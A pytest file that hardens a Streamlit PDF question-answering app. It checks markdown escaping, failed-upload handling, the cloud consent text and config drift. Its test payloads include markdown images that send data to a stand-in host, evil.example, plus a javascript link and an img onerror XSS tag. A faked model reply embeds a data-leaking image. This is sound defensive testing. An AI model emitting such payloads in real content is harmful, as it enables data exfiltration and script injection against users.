"""Hardening before retrieval lands: untrusted text, failed-upload loop, consent text, config drift."""
import pathlib
import re

import pytest
from streamlit.testing.v1 import AppTest

from rag import search_backend
from rag.config import Config
from rag.ingest.validate import PDFValidationError
from rag.providers import FakeProvider
from rag.textsafe import escape_markdown
from tests.test_member_a import _text_pdf
from tests.test_member_a_phase4 import CHUNKS, _doc

ROOT = pathlib.Path(__file__).resolve().parent.parent
APP = str(ROOT / "app.py")

PAYLOADS = [
    "![x](https://evil.example/a.png?q=secret)",
    "[click me](javascript:alert(1))",
    "<img src=x onerror=alert(1)>",
    "see https://evil.example/x and www.evil.example",
    ":smile: $$x^2$$ :red[colored]",
    "# heading\n- list\n1. numbered\n> quote\n```code```",
]


# ---------- escape_markdown ----------
@pytest.mark.parametrize("payload", PAYLOADS)
def test_every_punctuation_char_is_escaped(payload):
    out = escape_markdown(payload)
    leftover = re.sub(r"\\[!-/:-@\[-`{-~]", "", out)  # drop each backslash-escaped punctuation pair
    assert not re.search(r"[!-/:-@\[-`{-~]", leftover), out


def test_escape_keeps_hindi_and_line_breaks():
    text = "यह एक वाक्य है।\nदूसरी पंक्ति"
    out = escape_markdown(text)
    assert "यह एक वाक्य है" in out and "दूसरी पंक्ति" in out and "  \n" in out


def test_escape_handles_non_strings():
    assert escape_markdown(ValueError("a [b]")) == "a \\[b\\]"


# ---------- app helpers ----------
@pytest.fixture
def app(monkeypatch):
    provider = FakeProvider([])
    monkeypatch.setattr("rag.providers.get_provider", lambda mode=None, cloud_consent=False: provider)
    monkeypatch.setattr("rag.runlog.log_run", lambda *a, **k: None)
    monkeypatch.setattr("rag.summaries.clear_doc_summaries", lambda *a, **k: 0)

    def make(doc=None):
        at = AppTest.from_file(APP, default_timeout=30)
        if doc is not None:
            at.session_state["doc"] = doc
            at.session_state["history"] = []
        return at.run()

    make.provider = provider
    return make


def _rendered(at):
    elements = list(at.markdown) + list(at.error) + list(at.warning) + list(at.caption) + list(at.info)
    return [e.value for e in elements]


# An unescaped image, link, tag or URL is live markup. The escaped forms (`\!\[`, `\<img`) are plain text.
LIVE_MARKUP = [r"(?<!\\)!\[", r"(?<!\\)\]\(", r"(?<!\\)<img", r"(?<!\\)https?:", r"(?<!\\)www\."]


def _assert_no_live_markup(values):
    for v in values:
        for pattern in LIVE_MARKUP:
            assert not re.search(pattern, v), (pattern, v)


def test_malicious_pdf_text_is_shown_as_plain_text(app):
    evil = "Training used ten epochs. ![x](https://evil.example/a.png?q=1) <img src=x onerror=alert(1)>"
    doc = _doc()
    doc["chunks"] = [{**CHUNKS[1], "text": evil}]
    doc["search"] = search_backend.keyword_search(doc["chunks"])
    app.provider.replies = ["Answer: ![leak](https://evil.example/b.png?d=1) ten epochs.\nSources: [C1]"]
    at = app(doc)
    at.chat_input[0].set_value("how many epochs of training").run()
    assert not at.exception
    values = _rendered(at)
    assert any("ten epochs" in v for v in values)  # the content is still there
    _assert_no_live_markup(values)


def test_malicious_file_name_is_escaped(app):
    doc = _doc()
    doc["name"] = "![x](https://evil.example/a.png).pdf"
    _assert_no_live_markup(_rendered(app(doc)))


def test_provider_error_body_is_escaped(monkeypatch, app):
    from rag.providers import ProviderError

    def fail(mode=None, cloud_consent=False):
        raise ProviderError("Cloud provider error 500: ![x](https://evil.example/e.png)")

    monkeypatch.setattr("rag.providers.get_provider", fail)
    _assert_no_live_markup(_rendered(app(_doc())))


# ---------- failed upload is not retried on every rerun ----------
def test_failed_upload_is_ingested_once_and_error_persists(monkeypatch, tmp_path, app):
    calls = []

    def failing_ingest(path, **kwargs):
        calls.append(path)
        raise PDFValidationError("This is not a PDF file.")

    monkeypatch.setattr("rag.ingest.ingest_pdf", failing_ingest)
    at = app()
    at.file_uploader[0].upload("bad.pdf", b"%PDF-1.4 junk", "application/pdf").run()
    at.run()
    at.run()
    assert len(calls) == 1
    assert any("not a PDF" in e.value for e in at.error) and "doc" not in at.session_state


def test_a_new_file_is_tried_after_a_failed_one(monkeypatch, tmp_path, app):
    from rag.ingest import ingest_pdf as real_ingest

    calls = []

    def flaky(path, **kwargs):
        calls.append(path)
        if len(calls) == 1:
            raise PDFValidationError("This is not a PDF file.")
        return real_ingest(path, **kwargs)

    monkeypatch.setattr("rag.ingest.ingest_pdf", flaky)
    pdf = _text_pdf(tmp_path / "t.pdf", ["The model was trained for ten epochs on one GPU."])
    good = open(pdf, "rb").read()
    at = app()
    at.file_uploader[0].upload("bad.pdf", b"%PDF-1.4 junk", "application/pdf").run()
    at.file_uploader[0].upload("good.pdf", good, "application/pdf").run()
    assert len(calls) == 2 and at.session_state["doc"]["name"] == "good.pdf"
    assert not any("not a PDF" in e.value for e in at.error)


def test_removing_a_document_forgets_a_failed_upload(app):
    at = app(_doc())
    at.session_state["failed_upload"] = {"file_id": "x", "message": "old"}
    next(b for b in at.button if b.label == "Remove document and index").click().run()
    assert "failed_upload" not in at.session_state


# ---------- cloud consent text ----------
def test_cloud_warning_states_what_is_really_sent(app):
    at = app(_doc())
    at.radio[0].set_value("Send excerpts to cloud").run()
    text = " ".join(w.value for w in at.warning)
    assert "each question" in text and "up to 3 calls" in text
    assert "only your question" in text and "never sent" in text


def test_rag_mode_cloud_starts_in_cloud_mode_but_still_needs_consent(monkeypatch, app):
    monkeypatch.setattr("rag.config.CONFIG", Config(mode="cloud"))
    at = app(_doc())
    assert at.radio[0].value == "Send excerpts to cloud"
    assert at.chat_input[0].disabled  # no consent yet


# ---------- removed documents leave nothing behind ----------
def test_pdf_bytes_are_not_cached_outside_session_state():
    # st.cache_data would keep a removed document's bytes in memory; the viewer must not use it.
    assert "cache_data" not in (ROOT / "app.py").read_text(encoding="utf-8")


# ---------- config / .env.example drift ----------
def test_env_example_has_no_control_characters():
    text = (ROOT / ".env.example").read_text(encoding="utf-8")
    assert "\t" not in text and "\r" not in text.replace("\r\n", "")


def test_env_example_documents_every_variable_the_code_reads():
    pattern = r"RAG_[A-Z_]+|OPENROUTER_API_KEY"
    read = set(re.findall(pattern, (ROOT / "rag" / "config.py").read_text("utf-8")))
    read |= set(re.findall(pattern, (ROOT / "rag" / "providers.py").read_text("utf-8")))
    documented = set(re.findall(pattern, (ROOT / ".env.example").read_text("utf-8")))
    assert read <= documented, f"undocumented: {sorted(read - documented)}"


def test_streamlit_secrets_are_gitignored():
    assert ".streamlit/secrets.toml" in (ROOT / ".gitignore").read_text(encoding="utf-8")
